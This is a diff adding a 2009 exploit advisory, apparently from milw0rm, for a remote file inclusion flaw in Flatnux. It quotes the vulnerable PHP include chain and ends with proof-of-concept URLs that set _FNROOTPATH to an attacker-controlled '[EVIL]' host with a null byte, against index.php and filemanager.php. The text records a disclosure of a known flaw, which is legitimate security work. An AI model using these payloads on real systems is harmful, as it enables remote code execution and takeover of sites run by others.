@@ -1,0 +1,46 @@
+@ flatnux Flatnux-2009-01-27 RFI
+  zależności P 
+  + Alfons Luja 
+  + 2009 
+  + grts : All friends
+  
+  
+  VULN : 
+       +++ include/theme.php
+         ... 
+        <?php
+          if (eregi("theme.php", $_SERVER['PHP_SELF']))
+	     die();                         // 0 <-- I dont give a fuck 
+	
+
+             global $theme, $_FNROOTPATH,$lang;   //<-- 1 
+             global $forumback, $forumborder;       
+             $_FN['table_background']=&$forumback;
+             $_FN['table_border']=&$forumborder;
+
+
+             if ($forumback=="" && $forumborder==""){
+	        $forumback="ffffff";
+	        $forumborder="000000";
+                }
+                require_once ($_FNROOTPATH . "themes/$theme/theme.php");
+
+             /*------- Funzioni ridefinibili da theme.php--------------*/
+         //......
+      +++ /flatnux.php line 116:
+            
+           //$_FNROOTPATH Still dont have value 
+           include_once "./include/theme.php";   //-- 2
+          
+      +++ /filemanager.php 
+          include "./include/flatnux.php"; // -- RFI
+
+  p0c:
+     http://localhost/~flatnux/index.php?_FNROOTPATH=[EVIL]%00    
+     http://localhost/~flatnux/filemanager.php?mod=&op=&dir=/&opmod=newfile&filemanager_editor=tfuj_stary&_FNROOTPATH=[EVIl]%OO
+     ... itd ...
+
+  --http://www.wrzuta.pl/audio/xLyg0zckZS/--
+  #EŁOF lol
+
+# milw0rm.com [2009-02-03]
